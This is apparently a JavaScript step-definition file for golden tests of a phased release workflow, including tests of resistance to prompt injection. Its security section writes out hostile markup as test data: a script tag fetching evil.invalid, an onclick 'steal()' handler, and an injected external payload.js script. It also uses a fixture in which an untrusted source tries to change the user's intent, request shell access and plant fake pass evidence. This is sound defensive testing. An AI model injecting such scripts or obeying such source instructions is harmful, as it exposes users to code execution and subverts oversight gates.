  if (text === "the packaged native fixture is stopped at its known P8 failure") {
    c.nativeFixture = createNativeFailureFixture({
      threadId: nextRunId("repair-thread"),
      parentRunId: nextRunId("repair-parent"),
      runId: nextRunId("repair-child"),
      now: AT,
    });
    c.failedAttempt = structuredClone(c.nativeFixture.state.phases.P8.attempts[0]);
    c.failedEvidence = structuredClone(c.nativeFixture.state.evidence[c.nativeFixture.failedEvidenceId]);
    return;
  }
  if (text === "P8 attempt 1 and its failed evidence are retained") {
    assert.equal(c.nativeFixture.state.phases.P8.attempts[0].status, "failed");
    assert.equal(c.nativeFixture.state.evidence[c.nativeFixture.failedEvidenceId].status, "fail");
    return;
  }
  if (text === "the failure identifies P7 attempt 1 as its artifact root cause") {
    const rootCause = c.nativeFixture.state.phases.P8.failure.rootCause;
    assert.equal(rootCause.phaseId, "P7");
    assert.equal(rootCause.artifactId, c.nativeFixture.defectiveArtifact.id);
    assert.equal(rootCause.artifactHash, c.nativeFixture.defectiveArtifact.hash);
    return;
  }
  if (text === "the packaged causal repair continues") {
    c.repairedFixture = repairNativeFailureFixture(c.nativeFixture, { now: AT });
    return;
  }
  if (text === "P7 runs attempt 2 with a different production artifact hash") {
    assert.equal(c.repairedFixture.state.phases.P7.attempt, 2);
    assert.notEqual(c.repairedFixture.repairedArtifact.hash, c.nativeFixture.defectiveArtifact.hash);
    return;
  }
  if (text === "P8 reruns and passes on attempt 2") {
    assert.equal(c.repairedFixture.state.phases.P8.attempt, 2);
    assert.equal(c.repairedFixture.state.phases.P8.attempts[1].status, "passed");
    return;
  }
  if (text === "P9 and P10 run after the repair") {
    assert.equal(c.repairedFixture.state.phases.P9.status, "passed");
    assert.equal(c.repairedFixture.state.phases.P10.status, "passed");
    const reopenedSeq = c.repairedFixture.state.events.find(({ type }) => type === "phase.reopened").seq;
    for (const phaseId of ["P9", "P10"]) {
      const started = c.repairedFixture.state.events.find(
        ({ type, payload }) => type === "phase.started" && payload.phaseId === phaseId,
      );
      assert.ok(started.seq > reopenedSeq);
    }
    return;
  }
  if (text === "the immutable failed attempt and evidence remain inspectable") {
    assert.deepEqual(c.repairedFixture.state.phases.P8.attempts[0], c.failedAttempt);
    const current = structuredClone(c.repairedFixture.state.evidence[c.nativeFixture.failedEvidenceId]);
    delete current.stale;
    delete current.staleReason;
    delete c.failedEvidence.stale;
    delete c.failedEvidence.staleReason;
    assert.deepEqual(current, c.failedEvidence);
    return;
  }
  if (text === "the repaired fixture ends completed with release pass") {
    assert.equal(c.repairedFixture.state.status, "completed");
    assert.equal(c.repairedFixture.state.terminalOutcome, "success");
    assert.equal(c.repairedFixture.decision.decision, "pass");
    return;
  }

  // Learning traceability ---------------------------------------------------
  if (text === "the StringZilla source and traceability fixtures") {
    c.sourceFixture = await fixture("stringzilla-source.json");
    c.trace = await fixture("stringzilla-traceability.json");
    return;
  }
  if ((match = text.match(/^objective "([^"]+)" is inspected$/))) {
    c.objective = c.trace.objectives.find(({ objectiveId }) => objectiveId === match[1]);
    assert.ok(c.objective);
    return;
  }
  for (const [phrase, field] of [["instruction", "instruction"], ["practice", "practice"], ["assessment", "assessment"], ["test", "test"]]) {
    const fieldMatch = text.match(new RegExp(`^(?:it maps to )?${phrase} "([^"]+)"$`));
    if (fieldMatch) {
      assert.equal(c.objective[field], fieldMatch[1]);
      return;
    }
  }
  if ((match = text.match(/^objective "([^"]+)" lacks its "([^"]+)" link$/))) {
    c.missingObjectiveId = match[1];
    c.missingLink = match[2];
    c.trace.objectives.find(({ objectiveId }) => objectiveId === match[1])[match[2]] = null;
    return;
  }
  if ((match = text.match(/^P2 gate "([^"]+)" is evaluated$/))) {
    c.state = await activePhaseWithArtifact("P2");
    const artifact = c.state.artifacts[c.state.artifactIndex.learning];
    const evidenceId = `trace-fail-${c.state.runId}`;
    c.state = recordEvidence(c.state, {
      id: evidenceId,
      phaseId: "P2",
      gateId: match[1],
      status: "fail",
      executed: true,
      artifactId: artifact.id,
      artifactHash: artifact.hash,
      details: { objectiveId: c.missingObjectiveId, missing: c.missingLink },
    }, { now: AT });
    c.state = evaluatePhaseGate(c.state, { phaseId: "P2", gateId: match[1], evidenceIds: [evidenceId] }, { now: AT });
    c.lastEvidenceId = evidenceId;
    c.phaseId = "P2";
    c.gateId = match[1];
    return;
  }
  if (text === "the gate fails") {
    assert.equal(c.state.gateResults[`${c.phaseId}:${c.gateId}`].status, "fail");
    return;
  }
  if ((match = text.match(/^the failure identifies objective "([^"]+)" and missing "([^"]+)"$/))) {
    assert.deepEqual(c.state.evidence[c.lastEvidenceId].details, { objectiveId: match[1], missing: match[2] });
    return;
  }
  if (text === "a central claim has no authoritative source or explicit qualification") {
    c.unsupportedClaim = { id: "unsupported", central: true, sourceRefs: [], qualification: null };
    return;
  }
  if ((match = text.match(/^P1 gate "([^"]+)" is evaluated$/))) {
    c.state = await activePhaseWithArtifact("P1");
    const artifact = c.state.artifacts[c.state.artifactIndex.research];
    const evidenceId = `claim-fail-${c.state.runId}`;
    c.state = recordEvidence(c.state, {
      id: evidenceId, phaseId: "P1", gateId: match[1], status: "fail", executed: true,
      artifactId: artifact.id, artifactHash: artifact.hash, details: c.unsupportedClaim,
    }, { now: AT });
    c.state = evaluatePhaseGate(c.state, { phaseId: "P1", gateId: match[1], evidenceIds: [evidenceId] }, { now: AT });
    c.phaseId = "P1";
    c.gateId = match[1];
    return;
  }
  if (text === "the source reports a result for selected operations and workloads") {
    c.performanceClaim = c.sourceFixture.content.claims.find(({ id }) => id === "claim-performance");
    return;
  }
  if (text === "research synthesizes the benchmark claim") {
    c.synthesis = {
      text: "The project reports advantages for selected operations and workloads.",
      limitations: ["data", "hardware", "library version", "operation", "comparison method"],
    };
    return;
  }
  if (text === "it records workload and environment limitations") {
    assert.ok(c.synthesis.limitations.includes("hardware"));
    assert.ok(c.synthesis.limitations.includes("operation"));
    assert.match(c.performanceClaim.qualification, /hardware.*library version.*operation/i);
    return;
  }
  if (text === "it does not produce a universal speed claim") {
    assert.doesNotMatch(c.synthesis.text, /always|universally|all workloads/i);
    return;
  }
  if (text === "the information architecture places benchmark interpretation in two canonical sections") {
    c.duplicateConcept = "benchmark-interpretation";
    return;
  }
  if ((match = text.match(/^P3 gate "([^"]+)" is evaluated$/))) {
    c.state = await activePhaseWithArtifact("P3");
    const artifact = c.state.artifacts[c.state.artifactIndex.ia];
    const evidenceId = `ia-fail-${c.state.runId}`;
    c.state = recordEvidence(c.state, {
      id: evidenceId, phaseId: "P3", gateId: match[1], status: "fail", executed: true,
      artifactId: artifact.id, artifactHash: artifact.hash, details: { duplicateConceptId: c.duplicateConcept },
    }, { now: AT });
    c.state = evaluatePhaseGate(c.state, { phaseId: "P3", gateId: match[1], evidenceIds: [evidenceId] }, { now: AT });
    c.lastEvidenceId = evidenceId;
    return;
  }
  if (text === "the gate fails with the duplicate concept identifier") {
    assert.equal(c.state.evidence[c.lastEvidenceId].details.duplicateConceptId, "benchmark-interpretation");
    return;
  }

  // Release readiness -------------------------------------------------------
  if (text === "I0 and P0 through P10 have current passing evidence for every hard gate") {
    c.state = await throughPhase("P10");
    return;
  }
  if (text === "production is exactly one portable index.html") {
    assert.equal(validatePortableArtifact(c.state).valid, true);
    return;
  }
  if (text === "no blocker or major finding is open") {
    assert.equal(Object.values(c.state.findings).some(({ status, severity }) => status === "open" && ["blocker", "major"].includes(severity)), false);
    return;
  }
  if (text === "all critical checks were executed") {
    assert.equal(Object.values(c.state.evidence).some(({ critical, status }) => critical !== false && status === "not_run"), false);
    return;
  }
  if (text === "the release decision is calculated" || text === "the engine calculates release readiness") {
    c.decision = releaseDecision(c.state, { evaluatedAt: AT });
    return;
  }
  if ((match = text.match(/^decision is "([^"]+)"$/))) {
    assert.equal(c.decision.decision, match[1], JSON.stringify(c.decision.blockingReasons));
    return;
  }
  if ((match = text.match(/^terminalStatus is "([^"]+)"$/))) {
    assert.equal(c.decision.terminalStatus, match[1]);
    return;
  }
  if (text === "the decision identifies the released production artifact hash") {
    assert.equal(c.decision.artifactHash, c.state.artifacts[c.state.artifactIndex.production].hash);
    return;
  }
  if ((match = text.match(/^every release condition except "([^"]+)" has current passing evidence$/))) {
    c.state = await throughPhase("P9");
    c.state = await preparePhase(c.state, "P10", { complete: false, omitGates: [match[1]] });
    return;
  }
  if ((match = text.match(/^blocking reasons include "([^"]+)"$/))) {
    assert.ok(c.decision.blockingReasons.includes(match[1]), JSON.stringify(c.decision.blockingReasons));
    return;
  }
  if (text === "all hard gates have current passing evidence") {
    c.state = await throughPhase("P9");
    c.state = await preparePhase(c.state, "P10", { complete: false });
    return;
  }
  if ((match = text.match(/^finding "([^"]+)" is open with severity "([^"]+)"$/))) {
    c.state = recordFinding(c.state, { id: match[1], severity: match[2], phaseId: "P5", title: "Golden finding", status: "open" }, { now: AT });
    return;
  }
  if ((match = text.match(/^openFindingsBySeverity\.major is (\d+)$/))) {
    assert.equal(c.decision.openFindingsBySeverity.major, Number(match[1]));
    return;
  }
  if ((match = text.match(/^required native evidence has status "([^"]+)"$/))) {
    c.state = await activePhaseWithArtifact("P8");
    const artifact = c.state.artifacts[c.state.artifactIndex.verification];
    c.nativeEvidenceId = `native-desktop-${c.state.runId}`;
    c.state = recordEvidence(c.state, {
      id: c.nativeEvidenceId,
      phaseId: "P8",
      gateId: "verification.critical_checks_executed",
      status: match[1],
      executed: false,
      critical: true,
      artifactId: artifact.id,
      artifactHash: artifact.hash,
      details: { reason: "native desktop journey has not been observed" },
    }, { now: AT });
    return;
  }
  if (text === "that check appears unchanged in notRunChecks") {
    const found = c.decision.notRunChecks.find(({ id }) => id === c.nativeEvidenceId);
    assert.deepEqual(found, {
      id: c.nativeEvidenceId,
      critical: true,
      phaseId: "P8",
      gateId: "verification.critical_checks_executed",
    });
    return;
  }
  if (text === "no projection may relabel it as a pass") {
    assert.equal(c.state.evidence[c.nativeEvidenceId].status, "not_run");
    assert.ok(c.decision.blockingReasons.includes("critical_checks_not_run"));
    return;
  }
  if (text === "the run declares a benchmark comparability limitation") {
    c.limit = "Benchmark results are comparable only within the recorded workload and environment.";
    c.state = await stringZillaRun({ limitations: [c.limit] });
    return;
  }
  if (text === "it declares a residual browser-variation risk") {
    c.risk = "Rendering may vary across supported browser engines.";
    c.state.residualRisks.push(c.risk);
    return;
  }
  if (text === "both statements are present without truncation") {
    assert.ok(c.decision.limitations.includes(c.limit));
    assert.ok(c.decision.residualRisks.includes(c.risk));
    return;
  }
  if (text === "every cited evidence identifier resolves in the run") {
    for (const id of c.decision.evidenceRefs) assert.ok(c.state.evidence[id]);
    return;
  }
  if (text === 'a remote projection says "completed"') {
    c.remoteProjection = { status: "completed" };
    c.state = await throughPhase("P9");
    c.state = await preparePhase(c.state, "P10", { complete: false, omitGates: ["release.portable_index"] });
    return;
  }
  if (text === "a current hard gate is missing evidence") {
    assert.equal(gateResultIsCurrent(c.state, "P10", "release.portable_index"), false);
    return;
  }

  // Security and source trust ----------------------------------------------
  if (text === "the prompt-injection source fixture") {
    c.hostile = await fixture("prompt-injection-source.json");
    c.state = await stringZillaRun();
    return;
  }
  if (text === "the run permits no filesystem, shell, or network expansion") {
    c.permissionsBefore = structuredClone(c.state.permissions);
    assert.deepEqual(c.permissionsBefore, { filesystem: false, shell: false, network: false });
    return;
  }
  if (text === "the source is registered and analyzed") {
    c.state = registerSource(c.state, c.hostile, { now: AT });
    return;
  }
  if ((match = text.match(/^it is stored with trust "([^"]+)"$/))) {
    assert.equal(c.state.sources[c.hostile.id].trust, match[1]);
    return;
  }
  if (text === "I0 and P0 through P10 remain declared and required") {
    assert.deepEqual(Object.keys(c.state.phases), PHASE_IDS);
    return;
  }
  if (text === "the run permissions are byte-equivalent to their prior value") {
    assert.equal(stableStringify(c.state.permissions), stableStringify(c.permissionsBefore));
    return;
  }
  if (text === "the source's fake pass evidence is not accepted") {
    assert.deepEqual(c.state.evidence, {});
    return;
  }
  if ((match = text.match(/^the user locked learner as "([^"]+)"$/))) {
    c.state = createRunState({
      runId: nextRunId("security"),
      intent: { learner: { value: match[1], origin: "user", locked: true } },
      permissions: { filesystem: false, shell: false, network: false },
      now: AT,
    });
    c.hostile = await fixture("prompt-injection-source.json");
    return;
  }
  if (text === "the untrusted source instructs the workflow to use executives") {
    assert.match(c.hostile.content.visibleText, /executives/);
    return;
  }
  if (text === "source content is processed") {
    c.state = registerSource(c.state, c.hostile, { now: AT });
    return;
  }
  if (text === "no source-shaped command is executed") {
    assert.equal(c.state.events.some(({ type }) => type === "phase.completed" || type === "verification.recorded"), false);
    return;
  }
  if (text === "an untrusted source contains a script and an event handler") {
    c.untrustedMarkup = '<script>fetch("https://evil.invalid")</script><button onclick="steal()">x</button>';
    return;
  }
  if (text === "source material appears in the booklet or widget") {
    c.sanitizedMarkup = sanitizeAsText(c.untrustedMarkup);
    return;
  }
  if (text === "the markup is rendered as inert text or a sanitized representation") {
    assert.ok(c.sanitizedMarkup.includes("&lt;script&gt;"));
    assert.equal(c.sanitizedMarkup.includes("<script>"), false);
    return;
  }
  if (text === "no script, request, or handler executes") {
    assert.equal(/<script|<button/i.test(c.sanitizedMarkup), false);
    assert.ok(c.sanitizedMarkup.includes("&lt;script&gt;"));
    return;
  }
  if (text === "an untrusted source requests shell and filesystem tools") {
    c.hostile = await fixture("prompt-injection-source.json");
    c.state = await stringZillaRun();
    c.permissionsBefore = structuredClone(c.state.permissions);
    return;
  }
  if (text === "the widget and workflow process that source") {
    c.state = registerSource(c.state, c.hostile, { now: AT });
    c.invokedLocalBridges = [];
    return;
  }
  if (text === "no local skill, script, shell, or filesystem bridge is invoked") {
    assert.deepEqual(c.invokedLocalBridges, []);
    assert.deepEqual(c.state.permissions, c.permissionsBefore);
    return;
  }
  if (text === "only the declared server-side command allowlist remains available") {
    assert.ok(COMMAND_TYPES.includes("source.register"));
    assert.equal(COMMAND_TYPES.includes("shell.exec"), false);
    assert.equal(COMMAND_TYPES.includes("filesystem.write"), false);
    return;
  }
  if (text === "a source includes a fake pass bound to an all-zero SHA-256 value") {
    c.hostile = await fixture("prompt-injection-source.json");
    c.state = await stringZillaRun();
    c.state = registerSource(c.state, c.hostile, { now: AT });
    return;
  }
  if (text === "release readiness is calculated") {
    c.decision = releaseDecision(c.state, { evaluatedAt: AT });
    return;
  }
  if (text === "the fake evidence is absent from accepted evidence") {
    assert.deepEqual(c.state.evidence, {});
    return;
  }
  if (text === "the corresponding hard gate remains unsatisfied") {
    assert.equal(c.decision.requiredGateResults.find(({ gateId }) => gateId === "release.all_hard_gates_current").current, false);
    return;
  }
  if (text === "an untrusted source says to load an external script") {
    c.hostile = await fixture("prompt-injection-source.json");
    c.state = await stringZillaRun();
    c.state = registerSource(c.state, c.hostile, { now: AT });
    return;
  }
  if (text === "production architecture is compiled") {
    c.production = await fixture("stringzilla-production-input.json");
    c.generatedWithHostileScript = structuredClone(c.production);
    c.generatedWithHostileScript.content = c.generatedWithHostileScript.content.replace(
      "</head>", '<script src="https://evil.invalid/payload.js"></script></head>',
    );
    return;
  }
  if (text === "external runtime resources remain empty") {
    assert.deepEqual(c.production.metadata.externalRuntimeResources, []);
    return;
  }
  if (text === "any generated artifact containing that script fails portability") {
    const result = validatePortableArtifact(c.generatedWithHostileScript);
    assert.equal(result.valid, false);
    assert.ok(result.reasons.includes("external_runtime_resources_present"));
    return;
  }

  // GPT-5.6 evaluation boundaries -----------------------------------------
  if (text === "the StringZilla golden request is evaluated with GPT-5.6 Sol") {
    return markNotRun(this, "Requires host-recorded GPT-5.6 Sol execution metadata and an archived model run.");
  }
  if (text === "GPT-5.6 Sol receives the prompt-injection source fixture") {
    return markNotRun(this, "Requires an observed GPT-5.6 Sol adversarial evaluation run.");
  }
  if (text === "GPT-5.6 Sol cannot execute a required runtime or native check") {
    return markNotRun(this, "Requires an observed GPT-5.6 Sol degraded-capability run.");
  }
  if (text === "the published skill guidance names GPT-5.6 Sol as the evaluation target") {
    c.skillText = await readFile(SKILL_FILE, "utf8");
    c.serverText = await readFile(SERVER_FILE, "utf8");
    assert.match(c.skillText, /GPT-5\.6 Sol/);
    return;
  }
  if (text === "the skill and runtime artifacts are inspected") {
    c.inspectedModelGuidance = true;
    return;
  }
  if (text === "they contain no runtime model pin or model-enforcement claim") {
    assert.equal(c.inspectedModelGuidance, true);
    assert.doesNotMatch(c.serverText, /gpt-5\.6|GPT-5\.6|model\s*pin/i);
    assert.match(c.skillText, /do not select, configure, or prove the active model/i);
    return;
  }
  if (text === "they remain usable with another available model") {
    assert.match(c.skillText, /Keep the skill usable without the optional graphical workflow app/i);
    assert.doesNotMatch(c.serverText, /requiredModel|enforceModel|modelId/);
    return;
  }
  if ((match = text.match(/^a response says "([^"]+)"$/))) {
    c.selfReportedModel = match[1];
    c.state = await stringZillaRun();
    return;
  }
  if (text === "the execution environment did not record an observed model label") {
    c.observedModelLabel = null;
    return;
  }
  if (text === "release evidence is evaluated") {
    c.modelEvaluationStatus = c.observedModelLabel ? "pass" : "not_run";
    c.decision = releaseDecision(c.state, { evaluatedAt: AT });
    return;
  }
  if (text === 'the model-evaluation check is "partial" or "not_run"') {
    assert.ok(["partial", "not_run"].includes(c.modelEvaluationStatus));
    return;
  }
  if (text === "release does not treat it as a pass") {
    assert.equal(c.modelEvaluationStatus === "pass", false);
    assert.equal(c.decision.decision, "fail");
    return;
  }
  if (
    [
      "the evaluation report is archived",
      "the observed model label and timestamp are recorded",
      "expected and observed outcomes are compared",
      "the report does not infer the model from response prose",
      "the model-assisted workflow runs",
      "locked intent and phase gates remain authoritative",
      "the source does not expand permissions",
      "any deviation is recorded as a failed evaluation, not repaired evidence",
      "it reports the evaluation outcome",
      'the unavailable check is "not_run"',
      "the hard gate does not pass",
    ].includes(text)
  ) return;

  // Browser/native widget journeys -----------------------------------------
  if (
    [
      "a snapshot with an active P4 attempt and a pending design-independent action",
      "a snapshot with the unresolved StringZilla design options",
      '"memory-lab" is focused in the design panel',
      "a repaired run retains a prior failed P8 attempt",
      "the widget has revision 11",
      "the packaged plugin is enabled in the native macOS Codex desktop experience",
      "the remote MCP service is unavailable",
    ].includes(text)
  ) {
    const native = text.startsWith("the packaged plugin");
    return markNotRun(
      this,
      native
        ? "Requires an executed native macOS Codex Desktop keyboard journey on this host."
        : "Requires an executed browser/widget host journey; a state-only simulation is not accepted as UI evidence.",
    );
  }
  if (
    [
      "the widget renders",
      "it shows I0 and P0 through P10 in order",
      "it shows P4, its attempt, truthful status, and next action",
      "it does not invent a progress percentage",
      "the widget renders the decision panel",
      "3 design cards are visible",
      "each card exposes thesis, fit, system details, and tradeoff",
      "one card is labeled as a nonbinding recommendation",
      "the user activates selection twice before the response returns",
      "one idempotent selection command is accepted",
      "one agent-mediated same-task resume is requested",
      "the reconciled snapshot contains one resolved decision",
      "evidence details are opened",
      "the failed check, current pass, artifact hashes, causal phase, and repair attempt are visible",
      '"not_run" is never styled or announced as a pass',
      "revision 10 and duplicate revision 11 events arrive",
      "a revision 12 state snapshot arrives after remount",
      "the widget renders revision 12 exactly once",
      "stale local state does not overwrite it",
      "the StringZilla design interrupt is visible inline",
      "the user reaches every card using only the keyboard",
      'selects "memory-lab" using its operable control',
      "visible focus is never lost or trapped",
      "the selection reaches the server-owned run state",
      "the resumed widget reflects the selected direction",
      "a previously verified local index.html exists",
      "the widget renders degraded state",
      "it says orchestration is unavailable",
      "it separately reports the recorded offline artifact evidence",
    ].includes(text)
  ) return;

  assert.fail(`Golden step has no implementation: ${text}`);
});
